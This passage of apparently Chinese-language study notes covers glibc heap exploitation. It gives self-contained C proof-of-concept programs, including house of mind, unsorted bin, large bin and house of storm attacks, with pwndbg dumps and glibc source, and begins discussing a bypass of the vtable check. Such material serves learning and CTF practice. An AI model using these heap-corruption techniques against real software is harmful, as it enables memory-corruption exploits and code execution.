  intptr_t sc &#x3D; (intptr_t)jackpot;
  
  long offset &#x3D; (long)__builtin_frame_address(0) - (long)p4;
  memcpy((p4+offset+8), &amp;sc, 8); 
    
  assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和<code>2.23</code>差不多，就是多了一个从<code>small bin</code>链表进入<code>tcache</code>的操作</p>
<p>先填满<code>tcache</code>并创建一个<code>small bin</code>，再创建一个堆防止合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (smallbins) | PREV_INUSE
Addr: 0x405250
Size: 0x111
fd: 0x7ffff7dcfda0
bk: 0x7ffff7dcfda0

Free chunk (tcache)
Addr: 0x405360
Size: 0x110
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x405470
Size: 0x111
fd: 0x405370

Free chunk (tcache) | PREV_INUSE
Addr: 0x405580
Size: 0x111
fd: 0x405480

Free chunk (tcache) | PREV_INUSE
Addr: 0x405690
Size: 0x111
fd: 0x405590

Free chunk (tcache) | PREV_INUSE
Addr: 0x4057a0
Size: 0x111
fd: 0x4056a0

Free chunk (tcache) | PREV_INUSE
Addr: 0x4058b0
Size: 0x111
fd: 0x4057b0

Free chunk (tcache) | PREV_INUSE
Addr: 0x4059c0
Size: 0x111
fd: 0x4058c0

Allocated chunk | PREV_INUSE
Addr: 0x405ad0
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x405ec0
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x406380
Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再在栈上创建一个伪造的<code>free list</code>，将<code>fake_freelist</code>伪造成每<code>0x20</code>就链接到下一个地址，最后<code>0x80</code>不做操作</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x7fffffffdd20
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000405250	0x00007fffffffdd00
0x7fffffffdd40:	0x00007fffffffdda8	0x00000000000000f0
0x7fffffffdd50:	0x00000000000000c2	0x000000000040190d
0x7fffffffdd60:	0x0000000000405ed0	0x0000000000405ae0
pwndbg&gt; x&#x2F;10gx 0x7fffffffdd00
0x7fffffffdd00:	0x0000000000000000	0x0000000000000000
0x7fffffffdd10:	0x00007fffffffdd20	0x00007fffffffdc20
0x7fffffffdd20:	0x0000000000000000	0x0000000000000000
0x7fffffffdd30:	0x0000000000405250	0x00007fffffffdd00
0x7fffffffdd40:	0x00007fffffffdda8	0x00000000000000f0
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>改<code>small bin</code>中的堆的<code>bk</code>为伪造的<code>free list</code>地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110 [corrupted]
FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;
BK: 0x405250 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdc20 —▸ 0x7fffffffdc40 ◂— ...
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>清空<code>tcache</code>再创建一个堆，使得伪造的堆逆向链入<code>tcache</code>，这样再次申请就可以在<code>tcache</code>中申请到栈地址了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x110 [  7]: 0x7fffffffdcb0 —▸ 0x7fffffffdc90 —▸ 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdd10 —▸ 0x7fffffffdd30 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110 [corrupted]
FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;
BK: 0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 0x0
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (smallbins) | PREV_INUSE
Addr: 0x405250
Size: 0x111
fd: 0x7ffff7dcfda0
bk: 0x7fffffffdd20

Allocated chunk | PREV_INUSE
Addr: 0x405360
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405470
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405580
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405690
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4057a0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4058b0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x4059c0
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x405ad0
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x405ec0
Size: 0x4c1

Top chunk | PREV_INUSE
Addr: 0x406380
Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="house-of-mind-fastbin-arena"><a href="#house-of-mind-fastbin-arena" class="headerlink" title="house_of_mind_fastbin(arena)"></a>house_of_mind_fastbin(arena)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;

int main()&#123;
	int HEAP_MAX_SIZE &#x3D; 0x4000000;
	int MAX_SIZE &#x3D; (128*1024) - 0x100;
    
	uint8_t* fake_arena &#x3D; malloc(0x1000); 
	uint8_t* target_loc &#x3D; fake_arena + 0x30;

	uint8_t* target_chunk &#x3D; (uint8_t*) fake_arena - 0x10;

	fake_arena[0x888] &#x3D; 0xFF;
	fake_arena[0x889] &#x3D; 0xFF; 
	fake_arena[0x88a] &#x3D; 0xFF; 

	uint64_t new_arena_value &#x3D; (((uint64_t) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - 1);
	uint64_t* fake_heap_info &#x3D; (uint64_t*) new_arena_value;

	uint64_t* user_mem &#x3D; malloc(MAX_SIZE);
    
	while((long long)user_mem &lt; new_arena_value)&#123;
		user_mem &#x3D; malloc(MAX_SIZE);
	&#125;

	uint64_t* fastbin_chunk &#x3D; malloc(0x50); 
	uint64_t* chunk_ptr &#x3D; fastbin_chunk - 2; 
    
	uint64_t* tcache_chunks[7];
	for(int i &#x3D; 0; i &lt; 7; i++)&#123;
		tcache_chunks[i] &#x3D; malloc(0x50);
	&#125;	
	for(int i &#x3D; 0; i &lt; 7; i++)&#123;
		free(tcache_chunks[i]);
	&#125;

	fake_heap_info[0] &#x3D; (uint64_t) fake_arena; 
    
	chunk_ptr[1] &#x3D; 0x60 | 0x4; 
    
	free(fastbin_chunk); 
    
	assert(*((unsigned long *) (target_loc)) !&#x3D; 0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过伪造<code>arena</code>的<code>HEAP_MAX_SIZE、MAX_SIZE、system_mem</code>并申请到<code>fast bin</code>再释放来将一个<code>chunk</code>的内容为一个很大的值</p>
<p>其中需要绕过一个检查，即申请的内存不能大于<code>system_men</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (chunksize_nomask (victim) &lt;&#x3D; 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
				   &gt; av-&gt;system_mem, 0))
            malloc_printerr (&quot;malloc(): memory corruption&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0x1000</code>的堆用于伪造<code>arena</code>，由于没有刷新缓冲流所以有一个多出来的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x411

Allocated chunk | PREV_INUSE
Addr: 0x405660
Size: 0x1011

Top chunk | PREV_INUSE
Addr: 0x406670
Size: 0x1f991<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>0x888</code>的位置设置<code>system_men</code>大小为<code>0xFFFFFFFF</code></p>
<pre class="line-numbers language-none"><code class="language-none">0x405ef0:	0x0000000000000000	0x0000000000ffffff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>以<code>MAX_SIZE</code>的大小创建堆直至满足<code>user_mem &lt; new_arena_value</code>的最多数量，由于<code>mmap_threshold=0x20000</code>所以创建的堆大小为<code>0x1ff00</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x411

Allocated chunk | PREV_INUSE
Addr: 0x405660
Size: 0x1011

Allocated chunk | PREV_INUSE
Addr: 0x406670
Size: 0x1ff11

Allocated chunk | PREV_INUSE
Addr: 0x426580
Size: 0x1ff11

Allocated chunk | PREV_INUSE
Addr: 0x446490
Size: 0x1ff11

Allocated chunk | PREV_INUSE
Addr: 0x4663a0
Size: 0x1ff11
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>填满<code>tcache</code>创建一个<code>fast bin</code>，将<code>fake_heap_info</code>的<code>ar_ptr</code>给设置成<code>fake_arena</code>并设置<code>fast bin</code>的<code>non_main_arena</code>标志位，再全部释放之后即可根据<code>heap_info</code>的<code>ar_ptr</code>找到我们的假chunk并更改chunk的内容达到目的</p>
<h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()&#123;
	volatile unsigned long stack_var&#x3D;0;

	unsigned long *p&#x3D;malloc(0x410);
	malloc(500);
	free(p);
    
	p[1]&#x3D;(unsigned long)(&amp;stack_var-2);
    
	malloc(0x410);
    
	assert(stack_var !&#x3D; 0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同<code>2.23</code>，大小大于<code>tcache</code></p>
<h3 id="large-bin-attack-1"><a href="#large-bin-attack-1" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;assert.h&gt;
 
int main()
&#123;
    setbuf(stdout, NULL);

    unsigned long stack_var1 &#x3D; 0;
    unsigned long stack_var2 &#x3D; 0;

    unsigned long *p1 &#x3D; malloc(0x420);
    malloc(0x20);

    unsigned long *p2 &#x3D; malloc(0x500);
    malloc(0x20);

    unsigned long *p3 &#x3D; malloc(0x500);
    malloc(0x20);
 
    free(p1);
    free(p2);

    malloc(0x90);
    free(p3);

    p2[-1] &#x3D; 0x3f1;
    p2[0] &#x3D; 0;
    p2[2] &#x3D; 0;
    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);
    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);


    malloc(0x90);
 
    assert(stack_var1 !&#x3D; 0);
    assert(stack_var2 !&#x3D; 0);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用进入<code>large bin</code>插入的堆大小大于上一个堆的大小时会将上一个堆的<code>bk</code>和<code>bk_nextsize</code>的堆中写入当前堆的地址来实现改栈上地址为堆地址</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">while ((unsigned long) size &lt; chunksize_nomask (fwd))
                       &#123;
                         fwd &#x3D; fwd-&gt;fd_nextsize;
		  assert (chunk_main_arena (fwd));
                       &#125;

                     if ((unsigned long) size
		  &#x3D;&#x3D; (unsigned long) chunksize_nomask (fwd))
                       &#x2F;* Always insert in the second position.  *&#x2F;
                       fwd &#x3D; fwd-&gt;fd;
                     else
                       &#123;
                         victim-&gt;fd_nextsize &#x3D; fwd;
                         victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;
                         fwd-&gt;bk_nextsize &#x3D; victim;
                         victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;
                       &#125;
					bck &#x3D; fwd-&gt;bk;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先创建一个属于<code>small bin</code>的堆和两个属于<code>large bin</code>的堆，每个堆创建之后都要创建一个堆防止合并</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x405250
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405680
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x4056b0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405bc0
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x405bf0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x406100
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x406130
Size: 0x1fed1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放两个堆，再创建一个小于第一个堆大小的堆，使得第一个堆还在<code>unsorted bin</code>但第二个堆进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4052f0
smallbins
empty
largebins
0x500: 0x4056b0 —▸ 0x7ffff7dd00d0 (main_arena+1168) ◂— 0x4056b0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放第三个堆进入<code>unsorted bin</code>，改第二个堆大小小于第三个堆并改<code>bk</code>和<code>bk_nextsize</code>为<code>stack_var1 - 0x10</code>，<code>stack_var2 - 0x20</code>,此时&#96;&#96;P2 -&gt; bk -&gt; fd &#x3D; stack_var1_addr  P2 -&gt; bk_nextsize -&gt; fd_nextsize &#x3D; stack_var2_addr&#96;</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405bf0 —▸ 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405bf0
smallbins
empty
largebins
0x500 [corrupted]
FD: 0x4056b0 ◂— 0x0
BK: 0x4056b0 —▸ 0x7fffffffdd60 —▸ 0x405c00 ◂— 0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4056b0
0x4056b0:	0x0000000000000000	0x00000000000003f1
0x4056c0:	0x0000000000000000	0x00007fffffffdd60
0x4056d0:	0x0000000000000000	0x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>再次创建一个小的堆时第三个堆会进入<code>large bin</code>，此时会进行上面分析的操作使得第二个堆的<code>bk</code>和<code>bk_nextsize</code>中的栈地址的内容变成第三个堆地址</p>
<h3 id="house-of-storm-largebin-unsortedbin"><a href="#house-of-storm-largebin-unsortedbin" class="headerlink" title="house_of_storm(largebin + unsortedbin)"></a>house_of_storm(largebin + unsortedbin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char filler[0x60];
char target[0x60]; 

void init()&#123;
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
&#125;

int get_shift_amount(char* pointer)&#123;
	
	int shift_amount &#x3D; 0;
	long long ptr &#x3D; (long long)pointer;	
	
	while(ptr &gt; 0x20)&#123;
		ptr &#x3D; ptr &gt;&gt; 8; 
		shift_amount +&#x3D; 1; 
	&#125;	

	return shift_amount - 1; 
&#125;

int main()&#123;

	init();

    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
	int* tcaches[7];

	unsorted_bin &#x3D; malloc ( 0x4e8 );  
    
	malloc ( 0x18 ); 

	int shift_amount &#x3D; get_shift_amount(unsorted_bin);	
    
	size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);
	if(alloc_size &lt; 0x10)&#123;
		printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);
		puts(&quot;Chunk size is too small&quot;);
		exit(1);
	&#125;
	alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10; 
    if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;
    	return 1;
    &#125;

	if(alloc_size &lt; 0x410)&#123;
		for(int i &#x3D; 0; i &lt; 7; i++)&#123;
			tcaches[i] &#x3D; malloc(alloc_size);
		&#125;
		for(int i &#x3D; 0; i &lt; 7; i++)&#123;
			free(tcaches[i]);
		&#125;
	&#125;
	else&#123;
		puts(&quot;Not filling up the TCache&quot;);
	&#125;

	large_bin  &#x3D;  malloc ( 0x4d8 ); 
	malloc ( 0x18 );

	free ( large_bin ); 
	free ( unsorted_bin );

	unsorted_bin &#x3D; malloc(0x4e8);
	free(unsorted_bin);

	fake_chunk &#x3D; target - 0x10;

	((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; 
	(( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ; 
	(( size_t *) large_bin)[3] &#x3D; (size_t)fake_chunk - 0x18 - shift_amount; 

	
	ptr &#x3D; calloc(alloc_size, 1);
	strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);
	
	printf(&quot;String after %s\n&quot;, target);
	printf(&quot;Fake chunk ptr: %p\n&quot;, ptr);

	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>原理同<code>2.23</code>，<code>large bin</code>的应用同<code>2.27 large bin attack</code>，在<code>large bin attack</code>基础上利用<code>unsorted bin</code>实现任意地址分配</p>
<h2 id="glibc-2-24"><a href="#glibc-2-24" class="headerlink" title="glibc_2.24"></a>glibc_2.24</h2><p><code>2.24-2.28</code>最主要的区别就是加了<code>vtable</code>的检测，所以不能改<code>vtable</code>为堆地址</p>
<h3 id="house-of-orange-检测机制与绕过"><a href="#house-of-orange-检测机制与绕过" class="headerlink" title="house_of_orange-检测机制与绕过"></a>house_of_orange-检测机制与绕过</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">void _IO_vtable_check (void) attribute_hidden;

&#x2F;* Perform vtable pointer validation.  If validation fails, terminate
   the process.  *&#x2F;
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
&#123;
  &#x2F;* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  *&#x2F;
  uintptr_t section_length &#x3D; __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr &#x3D; (const char *) vtable;
  uintptr_t offset &#x3D; ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset &gt;&#x3D; section_length))
    &#x2F;* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  *&#x2F;
    _IO_vtable_check ();
  return vtable;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>即<code>vtable - start_libc_IO_vtables  &gt;= stop_libc_IO_vtables - start_libc_IO_vtables</code>时调用<code>_IO_vtable_check</code></p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p __stop___libc_IO_vtables - 1
$7 &#x3D; 0x7ffff7dcf627 &lt;_IO_str_chk_jumps+167&gt; &quot;&quot;
pwndbg&gt; p __start___libc_IO_vtables
$8 &#x3D; 0x7ffff7dce8c0 &lt;_IO_helper_jumps&gt; &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>_IO_vtable_check</code>函数具体内容如下</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">void attribute_hidden
_IO_vtable_check (void)
&#123;
#ifdef SHARED
  &#x2F;* Honor the compatibility flag.  *&#x2F;
  void (*flag) (void) &#x3D; atomic_load_relaxed (&amp;IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag &#x3D;&#x3D; &amp;_IO_vtable_check)
    return;

  &#x2F;* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  *&#x2F;
  &#123;
    Dl_info di;
    struct link_map *l;
    if (_dl_open_hook !&#x3D; NULL
        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) !&#x3D; 0
            &amp;&amp; l-&gt;l_ns !&#x3D; LM_ID_BASE))
      return;
  &#125;

#else &#x2F;* !SHARED *&#x2F;
  &#x2F;* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  *&#x2F;
  if (__dlopen !&#x3D; NULL)
    return;
#endif

  __libc_fatal (&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>基本没有什么可利用的点，由此可见只有将伪造的<code>vtable</code>地址放在<code>_IO_helper_jumps-_IO_str_chk_jumps+167</code>之间才能利用成功，这种情况下如果能将<code>vtable</code>设置成<code>_IO_str_jumps</code>或者<code>_IO_wstr_jumps</code>也可以调用文件操作函数来绕过<code>vtable</code>的检查并且<strong>不需要堆地址</strong>，一般常用的是<code>_IO_str_jumps</code></p>
<blockquote>
<p><code>_IO_str_jumps</code>是一个结构体，它定义了一系列函数指针，这些函数用于处理标准流（<code>stdin</code>，<code>stdout</code>，<code>stderr</code>）的输入输出操作。在C语言中，这些函数实现了不同的流操作，包括读取字符、写入字符、移动文件指针等。 <code>_IO_str_jumps</code>结构体通常用于实现C标准库中的标准流对象，例如<code>FILE</code>结构体（通过<code>FILE*_p</code>字段指向<code>_IO_str_jumps</code>），它提供了一些常用的操作函数，如<code>fgetc</code>、<code>fputc</code>等。</p>
</blockquote>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p _IO_str_jumps
$2 &#x3D; &#123;
  __dummy &#x3D; 0,
  __dummy2 &#x3D; 0,
  __finish &#x3D; 0x7ffff7a89fb0 &lt;_IO_str_finish&gt;,
  __overflow &#x3D; 0x7ffff7a89c90 &lt;__GI__IO_str_overflow&gt;,
  __underflow &#x3D; 0x7ffff7a89c30 &lt;__GI__IO_str_underflow&gt;,
  __uflow &#x3D; 0x7ffff7a88610 &lt;__GI__IO_default_uflow&gt;,
  __pbackfail &#x3D; 0x7ffff7a89f90 &lt;__GI__IO_str_pbackfail&gt;,
  __xsputn &#x3D; 0x7ffff7a88640 &lt;__GI__IO_default_xsputn&gt;,
  __xsgetn &#x3D; 0x7ffff7a88720 &lt;__GI__IO_default_xsgetn&gt;,
  __seekoff &#x3D; 0x7ffff7a8a0e0 &lt;__GI__IO_str_seekoff&gt;,
  __seekpos &#x3D; 0x7ffff7a88a10 &lt;_IO_default_seekpos&gt;,
